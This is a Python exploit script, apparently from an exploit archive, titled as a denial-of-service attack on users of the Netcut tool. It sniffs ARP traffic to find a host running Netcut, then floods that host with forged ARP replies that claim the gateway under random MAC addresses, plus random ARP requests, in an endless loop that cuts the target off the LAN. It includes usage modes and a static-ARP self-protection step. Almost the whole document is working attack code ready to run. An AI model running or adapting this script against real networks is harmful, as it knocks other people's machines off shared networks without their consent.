#!C:\Python26\python
#Exploit Title: Netcut Denial of Service Vulnerability
#Author: MaYaSeVeN
#Blog: http://mayaseven.blogspot.com
#PoC: Video  http://www.youtube.com/user/mayaseven
#     Picture http://3.bp.blogspot.com/-GcwpOXx7ers/TwGVoyj8SmI/AAAAAAAAAxs/wSGL1tKGflc/s1600/a.png
#Version: Netcut 2
#Software Link: http://www.mediafire.com/?jiiyq2wcpp41266
#Tested on: Windows Xp, Windows 7
#Greetz :  ZeQ3uL, c1ph3r, x-c0d3, p3lo, Retool2, Gen0TypE, Windows98SE, Sumedt, Rocky Sharma

from scapy.all import sniff,Ether,ARP,RandIP,RandMAC,Padding,sendp,conf
import subprocess,sys,os
    
def protect_XP(gw_ip,gw_mac):
    subprocess.call(["arp", "-s",gw_ip,gw_mac])
    print "Protected himself {XP}"
    
def protect_Vista(networkCon,gw_ip,gw_mac):
    subprocess.call(["netsh","interface","ipv4","add","neighbors",networkCon,gw_ip,gw_mac])
    print "Protected himself {NT}"
    
def detect():
        ans = sniff(filter='arp',timeout=7)
        target=[]
        for r in ans.res:
            target.append(r.sprintf("%ARP.pdst% %ARP.hwsrc% %ARP.psrc%"))
        return target
def preattack(gw_ip):
    flag = 0
    num = []
    count = 0
    target = 0
    temp = 0
    print "Detecting..."
    d = detect()
    for i in range(len(d)):
        if d[i].split()[0] == "255.255.255.255":
            num.append(d.count(d[i])) 
            if d.count(d[i]) > count:
                count = d.count(d[i])
                target = i
        if d[i].split()[0] == gw_ip:
            temp += 1       
    if len(d) < 7:
        print "[-] No one use Netcut or try again"
        exit()
    if len(num) * 7 < temp:
        num[:] = []
        count = 0
        result = float(temp) / len(d) * 100
        for j in range(len(d)):
            if d[j].split()[0] == gw_ip:
                if d.count(d[j]) > count:
                    count = d.count(d[j])
                    target = j
            result = float(temp) / len(d) * 100
        flag = 1
    else:
        num.reverse()
        result = float(num[0] + temp) / len(d) * 100
    print "There is a possibility that " + str(result) + "%"
    if result >= 50:
        target_mac = d[target].split()[1]
        target_ip = d[target].split()[2]
        print "[+] Detected, Netcut using by IP %s MAC %s" % (target_ip, target_mac)
        if flag == 0:
            attack(target_mac, target_ip, gw_ip)
        else:
            print "[-] Can't Attack"    
    else:
        print "[-] No one use Netcut or try again"
    
def attack(target_mac,target_ip,gw_ip):
    print "[+] Counter Attack !!!"
    e = Ether(dst="FF:FF:FF:FF:FF:FF")
    while 1:
        a = ARP(psrc=RandIP(),pdst=RandIP(),hwsrc=RandMAC(),hwdst=RandMAC(),op=1)
        p = e/a/Padding("\x00"*18)
        sendp(p,verbose=0)
        a1 = ARP(psrc=gw_ip,pdst=target_ip,hwsrc=RandMAC(),hwdst=target_mac,op=2)
        p1 = e/a1/Padding("\x00"*18)
        sendp(p1,verbose=0)

if __name__ == '__main__':
    conf.sniff_promisc=False
    os.system("cls")
    print   "###################################################"
    print    " __  __    __     __    _____   __      __  _   _"
    print    "|  \/  |   \ \   / /   / ____|  \ \    / / | \ | |"
    print    "| \  / | __ \ \_/ /_ _| (___   __\ \  / /__|  \| |"
    print    "| |\/| |/ _\ \   / _\ |\___ \ / _ \ \/ / _ \ . \ |"
    print    "| |  | | (_| || | (_| |____) |  __/\  /  __/ |\  |"
    print    "|_|  |_|\__,_||_|\__,_|_____/ \___| \/ \___|_| \_|"
    print   " "
    print   "###################################################"
    print   ""
    print   "http://mayaseven.blogspot.com"
    print   ""
    if (len(sys.argv) <= 4 and len(sys.argv) > 1):
        if(len(sys.argv) == 2):
            gw_ip  = sys.argv[1]
            preattack(gw_ip)
        if(len(sys.argv) == 3):
            gw_ip  = sys.argv[1]
            gw_mac = sys.argv[2]
            protect_XP(gw_ip,gw_mac)
            preattack(gw_ip)
        if(len(sys.argv) == 4):
            gw_ip  = sys.argv[1]
            gw_mac = sys.argv[2]
            networkCon = sys.argv[3]
            protect_Vista(networkCon,gw_ip,gw_mac)
            preattack(gw_ip)
    else:
        print '''
Mode:   
1.)Attack only
Usage: NetcutKiller <IP_Gateway>
e.g. NetcutKiller.py 192.168.1.1
        
2.)Attack with protect himself on WinXP
Usage: NetcutKiller <IP_Gateway> <MAC_Gateway> 
e.g. NetcutKiller.py 192.168.1.1 00:FA:77:AA:BC:AF
        
3.)Attack with protect himself on Win7 or NT
Usage: NetcutKiller <IP_Gateway> <MAC_Gateway> <Network Connection> 
e.g. NetcutKiller.py 192.168.1.1 00:FA:77:AA:BC:AF "Wireless Network Connection"
        ''' 